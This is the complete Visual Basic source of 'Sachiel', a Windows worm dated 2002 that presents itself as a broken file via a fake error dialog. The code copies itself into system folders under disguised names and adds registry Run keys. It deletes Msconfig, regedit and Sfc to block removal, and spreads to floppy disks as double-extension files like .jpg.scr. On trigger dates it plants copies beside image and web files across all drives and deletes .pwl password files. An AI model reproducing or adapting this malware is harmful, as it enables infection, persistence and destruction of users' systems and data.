   VERSION 5.00
   Begin VB.Form Sachiel
      BorderStyle     =   0  'None
      Caption         =   "Sachiel"
      ClientHeight    =   420
      ClientLeft      =   0
      ClientTop       =   0
      ClientWidth     =   420
      Enabled         =   0   'False
      Icon            =   "Sachiel.frx":0000
      LinkTopic       =   "Form1"
      MaxButton       =   0   'False
      MinButton       =   0   'False
      Picture         =   "Sachiel.frx":0442
      ScaleHeight     =   498.873
      ScaleMode       =   0  'User
      ScaleWidth      =   581.538
      ShowInTaskbar   =   0   'False
      Visible         =   0   'False
      Begin VB.Timer Timer1
         Interval        =   10000
         Left            =   0
         Top             =   0
      End
   End
   Attribute VB_Name = "Sachiel"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False
   Private Type SHFILEOPSTRUCT
   hWnd As Long
   wFunc As Long
   pFrom As String
   pTo As String
   fFlags As Integer
   fAnyOperationsAborted As Boolean
   hNameMappings As Long
   lpszProgressTitle As String
   End Type

   Private Declare Function SHFileOperation Lib "shell32.dll" Alias "SHFileOperationA" (lpFileOp As SHFILEOPSTRUCT) As Long
   Private Const FO_DELETE = &H3
   Private Const FO_COPY = &H2
   Private Const FOF_SILENT = &H4
   Private Const FOF_NOCONFIRMATION = &H10
   Private Const FOF_RENAMEONCOLLISION = &H8

   Private Sub Form_Load()
   'Gusano de Disckets "Sachiel" version final 4.5
   'Primera y modesta creacion programada por Machinedramon
   'Contactos a machinedramondark@latinmail.com
   'Proximo trabajo Shamshiel.
   'Un reconocimiento a 2 grandes maestros, los creadores de:
   '"I LOVE YOU" y "SirCam"
   'Tacna - Peru  17/03/2002
   'Hecho en el Peru, Calidad Mundial.

   On Error Resume Next

   Dim obj
   Dim x As String

   Set obj = CreateObject("Scripting.FileSystemObject")

   Set win = obj.GetSpecialFolder(0)
   Set sys = obj.GetSpecialFolder(1)

   win = LCase(win)
   sys = LCase(sys)

   If Right$(win, 1) <> "\" Then
   win = win & "\"
   End If

   If Right$(sys, 1) <> "\" Then
   sys = sys & "\"
   End If

   x = GetAttr(sys & "helpdks.dll")

   If x = "" Then

   Call iniciar

   Else

   Call reiniciar

   End If
   On Error GoTo 0

   End Sub

   Private Sub Timer1_Timer()
   Static num, rei As Integer

   If num = 60 Then
   num = 1
   rei = rei + 1

     On Error Resume Next

     If rei = 1 Then

     inf "marittsa.jpg.scr"

     ElseIf rei = 2 Then

     inf "3rimpact.bat"

     ElseIf rei = 3 Then

     inf "vidaMia.jpg.scr"

     ElseIf rei = 4 Then

     inf "informes.txt.pif"

     ElseIf rei = 5 Then
     rei = 0
     inf "Ovnis45.jpg.scr"

     End If

   Else

   num = num + 1

   End If


   On Error GoTo 0
   End Sub

   Private Sub inf(name As String)
   On Error Resume Next
   Dim obj
   Dim win, sys

   Set obj = CreateObject("Scripting.FileSystemObject")
   Set win = obj.GetSpecialFolder(0)
   Set sys = obj.GetSpecialFolder(1)

   win = LCase(win)
   sys = LCase(sys)

   If Right$(win, 1) <> "\" Then
   win = win & "\"
   End If

   If Right$(sys, 1) <> "\" Then
   sys = sys & "\"
   End If

   Dim d1, d2
   Set d1 = obj.Drives
   Dim drive As String
   For Each d2 In d1
   If d2.DriveType = 1 Then
   drive = (d2.Path & "\")

   Static file, tag As String

   file = Dir$(drive & "*.jpg")
   If file = "" Then file = Dir$(drive & "*.jpeg")
   If (file = tag) Or (file = "") Then

   Dim namer As String
   Dim x As String

   namer = drive & name

   x = Dir$(namer)

   If x = "" Then

   Dim a, b  As String
   SetAttr sys & "helpdks.dll", 0
   a = sys & "helpdks.dll"
   b = namer

   Dim SHFileOp As SHFILEOPSTRUCT
   Dim RetVal As Long
   Dim iFlags As Variant

   iFlags = iFlags + FOF_SILENT + FOF_NOCONFIRMATION + FOF_RENAMEONCOLLISION
   With SHFileOp
   .wFunc = FO_COPY
   .pFrom = a
   .pTo = b
   .fFlags = iFlags
   End With
   RetVal = SHFileOperation(SHFileOp)
   SetAttr sys & "helpdks.dll", 6
   End If

   Else

   Dim y, z, c As String
   c = Dir$(drive & file & ".scr")

   If c = "" Then
   SetAttr sys & "helpdks.dll", 0
   y = sys & "helpdks.dll"
   z = drive & file & ".scr"

   Dim SHFileOp1 As SHFILEOPSTRUCT
   Dim RetVal1 As Long
   Dim iFlags1 As Variant

   iFlags1 = iFlags1 + FOF_SILENT + FOF_NOCONFIRMATION + FOF_RENAMEONCOLLISION
   With SHFileOp1
   .wFunc = FO_COPY
   .pFrom = y
   .pTo = z
   .fFlags = iFlags1
   End With
   RetVal1 = SHFileOperation(SHFileOp1)
   SetAttr sys & "helpdks.dll", 6
   End If
   tag = Dir$(drive & "*.jpg")
   If tag = "" Then tag = Dir$(drive & "*.jpeg")
   End If
   End If
   Next
   On Error GoTo 0

   End Sub
   Sub iniciar()
   On Error Resume Next

   Dim obj
   Dim win, sys

   Set obj = CreateObject("Scripting.FileSystemObject")
   Set win = obj.GetSpecialFolder(0)
   Set sys = obj.GetSpecialFolder(1)

   win = LCase(win)
   sys = LCase(sys)

   If Right$(win, 1) <> "\" Then
   win = win & "\"
   End If

   If Right$(sys, 1) <> "\" Then
   sys = sys & "\"
   End If

   Dim directorio As String
   directorio = App.Path
   directorio = LCase(directorio)
   If Right$(directorio, 1) <> "\" Then
   directorio = directorio & "\"
   End If

   Dim s As String
   s = Dir$(directorio & App.EXEName & ".pif")
   If s <> "" Then
   namer = App.EXEName & ".pif"
   Else
   s = Dir$(directorio & App.EXEName & ".scr")
     If s <> "" Then
     namer = App.EXEName & ".scr"
     Else
     s = Dir$(directorio & App.EXEName & ".bat")
       If s <> "" Then
       namer = App.EXEName & ".bat"
       End If
     End If
   End If

   Dim SHFileOp1 As SHFILEOPSTRUCT
   Dim RetVal As Long
   Dim iFlags As Variant
   Dim i, d1, d2, d3 As String
   Dim RetVan As Long

   i = directorio & namer
   d1 = sys & "helpdks.dll"
   iFlags = iFlags + FOF_SILENT + FOF_NOCONFIRMATION + FOF_RENAMEONCOLLISION
   With SHFileOp1
   .wFunc = FO_COPY
   .pFrom = i
   .pTo = d1
   .fFlags = iFlags
   End With
   RetVal = SHFileOperation(SHFileOp1)

   d2 = win & "help\Sachiel.sys.bat"
   With SHFileOp1
   .wFunc = FO_COPY
   .pFrom = i
   .pTo = d2
   .fFlags = iFlags
   End With
   RetVan = SHFileOperation(SHFileOp1)

   d3 = sys & "winrun.sys.pif"
   With SHFileOp1
   .wFunc = FO_COPY
   .pFrom = i
   .pTo = d3
   .fFlags = iFlags
   End With
   RetVan = SHFileOperation(SHFileOp1)

   SetAttr win & "help\Sachiel.sys.bat", 6
   SetAttr sys & "Winrun.sys.pif", 6
   SetAttr sys & "helpdks.dll", 6

   Dim comp As String

   comp = Dir$(sys & "Msconfig.exe")

   If comp <> "" Then

   Kill (sys & "Msconfig.exe")

   End If

   comp = Dir$(win & "regedit.exe")

   If comp <> "" Then

   Kill (win & "regedit.exe")

   End If

   comp = Dir$(sys & "Sfc.exe")

   If comp <> "" Then

   Kill (sys & "Sfc.exe")

   End If

   registrando "HKEY_LOCAL_MACHINE\\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Thsys", sys & "winrun.sys.pif"
   registrando "HKEY_LOCAL_MACHINE\\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Mmsystem", win & "help\Sachiel.sys.bat"
   registrando "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Soundir", "0"

   MsgBox "El Archivo esta parcial o totalmente dañado imposible abrir el archivo", 16, "Error"
   id = Shell(win & "help\sachiel.sys.bat", vbHide)
   End
   On Error GoTo 0
   End Sub
   Sub reiniciar()
   On Error Resume Next

   Dim obj
   Dim win, sys

   Set obj = CreateObject("Scripting.FileSystemObject")
   Set win = obj.GetSpecialFolder(0)
   Set sys = obj.GetSpecialFolder(1)

   win = LCase(win)
   sys = LCase(sys)

   If Right$(win, 1) <> "\" Then
   win = win & "\"
   End If

   If Right$(sys, 1) <> "\" Then
   sys = sys & "\"
   End If

   If App.PrevInstance Then

   End

   Else

   Dim directorio As String
   directorio = App.Path
   directorio = LCase(directorio)
   If Right$(directorio, 1) <> "\" Then
   directorio = directorio & "\"
   End If

   If (directorio <> win & "help\") And (directorio <> sys) Then

   MsgBox "El Archivo esta parcial o totalmente dañado imposible abrir el archivo", 16, "Error"

   End

   End If

   Dim SHFileOp1 As SHFILEOPSTRUCT
   Dim RetVal As Long
   Dim iFlags As Variant
   iFlags1 = iFlags1 + FOF_SILENT + FOF_NOCONFIRMATION + FOF_RENAMEONCOLLISION

   If directorio = sys Then

   p = GetAttr(win & "help\Sachiel.sys.bat")

   If p = "" Then

   With SHFileOp1
   .wFunc = FO_COPY
   .pFrom = sys & "winrun.sys.pif"
   .pTo = win & "help\Sachiel.sys.bat"
   .fFlags = iFlags
   End With
   RetVal = SHFileOperation(SHFileOp1)

   registrando "HKEY_LOCAL_MACHINE\\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Mmsystem", win & "help\Sachiel.sys.bat"

   Else

   End

   End If
   End If

   If directorio = win & "help\" Then

   p = GetAttr(sys & "winrun.sys.pif")

   If p = "" Then

   With SHFileOp1
   .wFunc = FO_COPY
   .pFrom = win & "help\sachiel.sys.bat"
   .pTo = sys & "winrun.sys.pif"
   .fFlags = iFlags
   End With
   RetVal = SHFileOperation(SHFileOp1)

   registrando "HKEY_LOCAL_MACHINE\\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Th23", sys & "winrun.sys.pif"

   End If

   End If

   Dim digi As Integer
   Dim r As String

   digi = Month(Date) + Day(Date)

     If (digi = 10) Or (digi = 29) Then
     Dim l0, l1
     Set l0 = CreateObject("WScript.Shell")

     l1 = l0.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Soundir")
     r = Dir$(sys & "Adan.scr")
     If (l1 = "0") Or (r <> "") Then
     registrando "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Soundir", "1"
     Call driv

     End If

     Else

     registrando "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Soundir", "0"

     End If

   End If
   On Error GoTo 0
   End Sub

   Sub driv()
   'rutina tomada y aprendida de "I LOVE YOU"
   On Error Resume Next
   Set obj = CreateObject("Scripting.FileSystemObject")
   Dim d1, d2
   Set d1 = obj.Drives
   For Each d2 In d1
   If d2.DriveType = 2 Or d2.DriveType = 3 Then
   listdir (d2.Path & "\")
   End If
   Next
   On Error GoTo 0
   End Sub

   Sub listdir(direc)
   'rutina tomada y aprendida de "I LOVE YOU"
   Dim obj
   Dim d1, d2, d3

   Set obj = CreateObject("Scripting.FileSystemObject")
   Set d1 = obj.getfolder(direc)
   Set d2 = d1.subfolders
   For Each d3 In d2
   listdir (d3.Path)
   copyjpg (d3.Path)
   Next
   End Sub

   Sub copyjpg(direc)
   'rutina tomada y modificada de "I LOVE YOU"
   Dim obj
   Set obj = CreateObject("Scripting.FileSystemObject")
   Dim exten, ident, d1
   Dim d2, d3
   Dim win, sys
   Set win = obj.GetSpecialFolder(0)
   Set sys = obj.GetSpecialFolder(1)

   win = LCase(win)
   sys = LCase(sys)

   If Right$(win, 1) <> "\" Then
   win = win & "\"
   End If

   If Right$(sys, 1) <> "\" Then
   sys = sys & "\"
   End If

   Set d1 = obj.getfolder(direc)
   Set d2 = d1.Files
   For Each d3 In d2
   exten = obj.getextensionname(d3.Path)
   iden = obj.getbasename(d3.Path)
   Dim hlp As String
   hlp = sys & "helpdks.dll"
   exten = LCase(exten)
   If (exten = "jpg") Or (exten = "jpeg") Then

   FileCopy (hlp), (d1 & "\" & iden & "." & exten & ".scr")

   ElseIf (exten = "gif") Or (exten = "html") Or (exten = "htm") Then

   FileCopy (hlp), (d1 & "\" & iden & "." & exten & ".pif")

   ElseIf (exten = "pwl") Then

   Kill (d1 & "\" & iden & "." & exten)

   End If

   Next
   End Sub
   Sub registrando(ruta, llave)
   'rutina aprendida de "I LOVE YOU"
   Set cr = CreateObject("WScript.Shell")
   cr.RegWrite ruta, llave
   End Sub
